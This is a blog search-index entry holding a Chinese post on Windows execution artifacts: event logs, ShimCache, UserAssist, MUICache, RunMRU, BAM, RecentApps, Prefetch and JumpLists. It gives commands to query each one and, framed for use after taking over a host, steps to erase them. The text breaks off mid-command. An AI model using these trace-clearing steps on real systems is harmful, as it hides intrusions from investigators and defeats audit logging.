<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows取证——文件执行记录的获取和清除</title>
      <link href="/2020/01/28/windows%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E5%92%8C%E6%B8%85%E9%99%A4/"/>
      <url>/2020/01/28/windows%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E5%92%8C%E6%B8%85%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们拿下一台windows主机权限的时候之后，我们第一步需要全面了解主机的信息，而文件执行记录也是一个非常重要的点，下面总结常见文件执行记录的位置、以及单条清除方法</p><h2 id="从日志中获取"><a href="#从日志中获取" class="headerlink" title="从日志中获取"></a>从日志中获取</h2><h3 id="Audit-Process-Creation-592-4688"><a href="#Audit-Process-Creation-592-4688" class="headerlink" title="Audit Process Creation (592/4688)"></a>Audit Process Creation (592/4688)</h3><p>在启用了”审核进程创建”时记录4688的情况下（系统默认是关闭的，需要手动开启），<code>Windows 7</code>、<code>Windows Server 2008</code>及以上版本，会在每次创建一个进程时会把事件以<code>Event ID</code>为<code>4688</code>记录到windows安全日志中</p><p><strong>注</strong>：<code>Windows XP/2003</code>的<code>Event ID</code>为<code>592</code></p><p>开启：<code>Edit Default Domain Policy -&gt; Policy location: Computer Configuration -&gt; Policies -&gt; Windows Settings -&gt; Security Settings -&gt; Advanced Audit Configuration -&gt; Detailed Tracking</code></p><p>策略名称: <code>Audit Process Creation</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126171026-b0e8c590-401b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>查看ID为<code>4688</code>的安全事件：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126171906-e7079eca-401c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>命令行获取：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /rd:true /f:text /q:"Event[System[(EventID=4688)]]"</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126171116-ce899746-401b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：可以参考三好学生师傅<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/" target="_blank" rel="noopener">这篇文章</a></p><h2 id="Program-Inventory-Event-Log"><a href="#Program-Inventory-Event-Log" class="headerlink" title="Program Inventory Event Log"></a>Program Inventory Event Log</h2><blockquote><p><code>Program Inventory</code>win7及以上存在，主要用于记录软件活动摘要、安装的程序、安装的Internet Explorer加载项、更新的应用程序、已删除的应用程序</p></blockquote><p>文件夹中的位置：<code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-Application-Experience%4Program-Inventory.evtx</code>，如图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128124944-9a1ea3e2-4189-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>在Windows事件查看器的位置：<code>Applications and Services Logs\Microsoft\Application-Experience\Program-Inventory</code>，如图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128124853-7c11dfcc-4189-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>日志获取：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /f:text Microsoft-Windows-Application-Experience/Program-Inventory</span><br></pre></td></tr></tbody></table></figure><p></p><p>Envent IDs：</p><ol><li>800 (<code>summary of software activities</code>)</li><li>900 &amp; 901 (<code>new Internet Explorer add-on</code>)</li><li>903 &amp; 904 (<code>new application installation</code>)</li><li>905  (<code>updated application</code>)</li><li>907 &amp; 908 (<code>removed application</code>)</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128125215-f42d7aca-4189-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：可以参考三好学生师傅<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/" target="_blank" rel="noopener">这篇文章</a></p><h3 id="Program-Telemetry-Event-Log"><a href="#Program-Telemetry-Event-Log" class="headerlink" title="Program-Telemetry Event Log"></a>Program-Telemetry Event Log</h3><blockquote><p>win7及以上存在，在应用程序启动时为应用程序处理应用程序兼容性缓存请求</p></blockquote><p>文件夹中的位置：<code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128131153-b2d44146-418c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>在Windows事件查看器的位置：<code>Applications and Services Logs\Microsoft\Application-Experience\Program-Telemetry</code>，如图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128130941-63f94760-418c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>日志获取：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /f:text Microsoft-Windows-Application-Experience/Program-Telemetry</span><br></pre></td></tr></tbody></table></figure><p></p><p>Event IDs：500/505</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128130836-3ce95dea-418c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：可以参考三好学生师傅<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/" target="_blank" rel="noopener">这篇文章</a></p><h2 id="从注册表中获取"><a href="#从注册表中获取" class="headerlink" title="从注册表中获取"></a>从注册表中获取</h2><h3 id="ShimCache-AppCompatCache"><a href="#ShimCache-AppCompatCache" class="headerlink" title="ShimCache (AppCompatCache)"></a>ShimCache (AppCompatCache)</h3><blockquote><p>用来识别应用程序兼容性问题。缓存数据跟踪文件路径、大小、上次修改时间和是否被执行（取决于操作系统），Windows XP的ShimCache被限制为96条记录，此后所有版本最多保留1024条记录。</p></blockquote><p><strong>注</strong>：虽然记录在<code>ShimCache</code>中的存在但是并不能100%证明文件是被执行过的，但它确实显示了与文件交互的窗口</p><p>注册表位置：</p><p><strong>注</strong>：数据加密，重启之后更新<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126202509-e4c9ce48-4036-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>解析工具（C#）：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EricZimmerman/AppCompatCacheParser/</span><br></pre></td></tr></tbody></table></figure><p></p><p>例子<br>以csv格式保存的指定路径<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AppCompatCacheParser.exe --csv .</span><br></pre></td></tr></tbody></table></figure><p></p><p>按上次修改时间排序<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AppCompatCacheParser.exe --csv . -t</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126180408-311f70a4-4023-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>如果我们想离线分析，我们可以用这个项目：<a href="https://github.com/mandiant/ShimCacheParser" target="_blank" rel="noopener">https://github.com/mandiant/ShimCacheParser</a></p><p>导出注册表<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg</span><br></pre></td></tr></tbody></table></figure><p></p><p>解析<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ShimCacheParser.py -o test.csv -r ShimCache.reg -t</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126180816-c54a6a86-4023-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126200434-044bed26-4034-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：</p><ol><li><p>导出<code>ShimCache</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg</span><br></pre></td></tr></tbody></table></figure></li><li><p>重启之后（只能重启之后<code>ShimCache</code>才会更新，注销不行），导入注册表将重启之后的覆盖掉</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg import ShimCache.reg</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="UserAssist"><a href="#UserAssist" class="headerlink" title="UserAssist"></a>UserAssist</h2><blockquote><p>跟踪在资源管理器中打开的可执行文件和完整路径，其中UserAssist保存了windows执行的程序的运行次数和上次执行日期和时间。</p></blockquote><p>注册表位置：</p><p><strong>注</strong>：记录实时更新，数据rot-13加密</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当前用户：</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</span><br><span class="line"></span><br><span class="line">所有用户：</span><br><span class="line">HKEY_USERS\&lt;sid&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</span><br><span class="line">`</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126202751-44d7c88a-4037-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>解析工具：<a href="https://www.nirsoft.net/utils/userassist_view.html" target="_blank" rel="noopener">https://www.nirsoft.net/utils/userassist_view.html</a></p><p>图形化界面<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126202103-51d37774-4036-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>命令行使用<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UserAssistView.exe  /stext out.txt //保存文本格式</span><br><span class="line">UserAssistView.exe  /shtml out.txt //保存html格式</span><br><span class="line">UserAssistView.exe  /sxml out.txt  //保存xml格式</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126202212-7b172b4e-4036-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：删除对应的键值即可</p><h2 id="MUICache"><a href="#MUICache" class="headerlink" title="MUICache"></a>MUICache</h2><blockquote><p>每次开始使用新的应用程序时，Windows都会自动从exe文件的版本资源中提取应用程序名，并将其存储在名为<code>MuiCache</code>的注册表项中，供以后使用。</p></blockquote><p><strong>注</strong>：无加密，记录实时更新</p><p>注册表位置：<br>windows server 2003及以前的<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当前用户：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/ShellNoRoam/MUICache</span><br><span class="line"></span><br><span class="line">所有用户：</span><br><span class="line">HKEY_USERS\&lt;sid&gt;\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache</span><br></pre></td></tr></tbody></table></figure><p></p><p>windows server 2003及以后的<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当前用户：</span><br><span class="line">HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache</span><br><span class="line"></span><br><span class="line">所有用户：</span><br><span class="line">HKEY_USERS\&lt;sid&gt;\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126203606-6c537020-4038-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>图形化界面：</p><p>解析工具：<a href="http://www.nirsoft.net/utils/muicache_view.html" target="_blank" rel="noopener">http://www.nirsoft.net/utils/muicache_view.html</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126203629-79cad5d6-4038-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>命令行使用<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MUICache.exe  /stext out.txt //保存文本格式</span><br><span class="line">MUICache.exe  /shtml out.txt //保存html格式</span><br><span class="line">MUICache.exe  /sxml out.txt  //保存xml格式</span><br></pre></td></tr></tbody></table></figure><p></p><p>或者命令行直接查询注册表也可以<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126203850-cdfd7410-4038-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：删除对应的键值即可</p><h2 id="RunMRU"><a href="#RunMRU" class="headerlink" title="RunMRU"></a>RunMRU</h2><blockquote><p>保存Win+R启动程序的历史记录</p></blockquote><p>注册表位置：</p><p><strong>注</strong>：数据无加密，记录实时更新<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当前用户：</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br><span class="line"></span><br><span class="line">所有用户：</span><br><span class="line">HKEY_USERS\&lt;sid&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br></pre></td></tr></tbody></table></figure><p></p><p>命令行查询注册表<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126204240-56cc74a8-4039-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：删除注册表对应的键值即可</p><h2 id="AppCompatFlags-Registry-Keys"><a href="#AppCompatFlags-Registry-Keys" class="headerlink" title="AppCompatFlags Registry Keys"></a>AppCompatFlags Registry Keys</h2><p>保存所有以兼容模式启动的程序（包括以管理员身份运行的程序）：</p><p><strong>注</strong>：无加密，数据实时更新<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers</span><br></pre></td></tr></tbody></table></figure><p></p><p>查询方式直接查询注册表即可：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128194649-de61e0d4-41c3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>保存所有执行过的程序：</p><p>解析工具：<a href="https://nirsoft.net/utils/executed_programs_list.html" target="_blank" rel="noopener">https://nirsoft.net/utils/executed_programs_list.html</a></p><p>这个工具会解析如下路径（包含了上面我们说过的<code>MUICache</code>，也包含了我们后面说的<code>Prefetch</code>）</p><p><strong>注</strong>：1 ~ 4无加密，5加密，1 ~ 5数据实时更新<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Registry Key: HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache</span><br><span class="line">2. Registry Key: HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache</span><br><span class="line">3. Registry Key: HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted</span><br><span class="line">4. Registry Key: HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store</span><br><span class="line">5. Windows Prefetch folder (C:\Windows\Prefetch)</span><br></pre></td></tr></tbody></table></figure><p></p><p>图形化界面：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126223659-4f219322-4049-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>命令行解析：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExecutedProgramsList.exe  /stext out.txt //保存文本格式</span><br><span class="line">ExecutedProgramsList.exe  /shtml out.txt //保存html格式</span><br><span class="line">ExecutedProgramsList.exe  /sxml out.txt  //保存xml格式</span><br></pre></td></tr></tbody></table></figure><p></p><p>清除方法：删除对应的注册表键值</p><h3 id="Background-Activity-Moderator-BAM"><a href="#Background-Activity-Moderator-BAM" class="headerlink" title="Background Activity Moderator (BAM)"></a>Background Activity Moderator (BAM)</h3><blockquote><p>BAM是一个控制后台应用程序活动的Windows服务，该服务存在于windows10 version 1709及以后版本中</p></blockquote><p>注册表路径为：</p><p><strong>注</strong>：记录实时更新，数据无加密<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\{SID}</span><br></pre></td></tr></tbody></table></figure><p></p><p>记录包含了程序路径和上次执行日期和时间，其中执行日期键值类型为<code>FILETIME(64bit little Endian)</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127222301-866f29f8-4110-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>执行时间提取：以<code>winrar</code>为例子</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200127235205-f77bfc5a-411c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>把<code>filetime</code>转化为<code>datetime</code><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">nt_timestamp = struct.unpack(<span class="string">"&lt;Q"</span>, unhexlify(<span class="string">"dc14dd91be7cd501"</span>))[<span class="number">0</span>]</span><br><span class="line">epoch = datetime(<span class="number">1601</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">nt_datetime = epoch + timedelta(microseconds=nt_timestamp / <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">print(nt_datetime.strftime(<span class="string">"%Y/%m/%d %H:%M:%S"</span>))</span><br></pre></td></tr></tbody></table></figure><p></p><p>output：<code>2019/10/07 03:23:21</code></p><p>清除方法：删除对应的注册表键值</p><h2 id="RecentApps"><a href="#RecentApps" class="headerlink" title="RecentApps"></a>RecentApps</h2><blockquote><p>win10之后特有，RecentApps包含了系统上已访问的多个应用程序和文件的引用。除了应用程序和文件名之外，RecentApps还提供了应用程序的路径，启动计数，文件的完整路径以及上次访问文件的时间。</p></blockquote><p><a href="https://df-stream.com/2017/10/recentapps/" target="_blank" rel="noopener">参考文章</a></p><p>注册表位置为：<br><strong>注</strong>：记录实时更新，数据无加密<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\Current Version\Search\RecentApps</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>RecentApps</code>键的下面是一系列由GUID命名的子项，在RecentApps下的每个<code>GUID</code>子项都对应一个应用程序。一些GUID子项也具有其他子项，它们与应用程序访问的特定文件相对应。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200128001313-eb404cc2-411f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p><strong>注</strong>：<code>LastAccessedTime</code>是采用64位的<code>FILETIME</code>格式，转化为<code>datetime</code>也比较简单，用系统自带的<code>w32tm.exe</code>就行<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w32tm.exe /ntte 131781889970180000</span><br><span class="line"></span><br><span class="line">output: 152525 08:03:17.0180000 - 2018/8/8 16:03:17</span><br></pre></td></tr></tbody></table></figure><p></p><p>或者用powershell<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -c "[datetime]::FromFileTime(0x1d42eee43808fa0)"</span><br><span class="line"></span><br><span class="line">output: 2018年8月8日 16:03:17</span><br></pre></td></tr></tbody></table></figure><p></p><p>清除方法：删除对应的注册表键值</p><h2 id="从文件中获取"><a href="#从文件中获取" class="headerlink" title="从文件中获取"></a>从文件中获取</h2><h3 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h3><blockquote><p>Prefetch是预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。之所以自动创建Prefetch文件夹，是为了加快系统启动的进程。</p></blockquote><p>查看该功能是否开启：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher</span><br></pre></td></tr></tbody></table></figure><p></p><p>键值代表的含义<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Application launch prefetching enabled</span><br><span class="line">2 = Boot prefetching enabled</span><br><span class="line">3 = Applaunch and Boot enabled (Optimal and Default)</span><br></pre></td></tr></tbody></table></figure><p></p><p>位置为：</p><p><strong>注</strong>：实时更新，数据加密<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Prefetch</span><br></pre></td></tr></tbody></table></figure><p></p><p>解析工具:<a href="https://github.com/EricZimmerman/PECmd" target="_blank" rel="noopener">https://github.com/EricZimmerman/PECmd</a></p><p>参数:<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PECmd.exe -f "C:\Temp\CALC.EXE-3FBEF7FD.pf"</span><br><span class="line">PECmd.exe -f "C:\Temp\CALC.EXE-3FBEF7FD.pf" --json "D:\jsonOutput" --jsonpretty</span><br><span class="line">PECmd.exe -d "C:\Temp" -k "system32, fonts"</span><br><span class="line">PECmd.exe -d "C:\Temp" --csv "c:\temp" --json c:\temp\json</span><br><span class="line">PECmd.exe -d "C:\Windows\Prefetch"</span><br></pre></td></tr></tbody></table></figure><p></p><p>PS：按<code>csv</code>导出的有两个文件：<code>"time_prefix".PECmd_Output.csv</code>和<code>"time_prefix".PECmd_Output_Timeline.csv</code>，前者保存了详情信息，后者只保存了运行时间和可执行程序的名称</p><p><code>"time_prefix".PECmd_Output_Timeline.csv</code>的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126230217-d7dfe986-404c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p><code>"time_prefix".PECmd_Output.csv</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200126224940-14e3bc2e-404b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>清除方法：根据<code>PECmd</code>导出的结果删除对应的pf文件即可</p><h3 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h3><blockquote><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件</p></blockquote><p>位置：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%APPDATA%\Microsoft\Windows\Recent</span><br></pre></td></tr></tbody></table></figure><p></p><p>查询：直接列出文件(夹)即可<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir 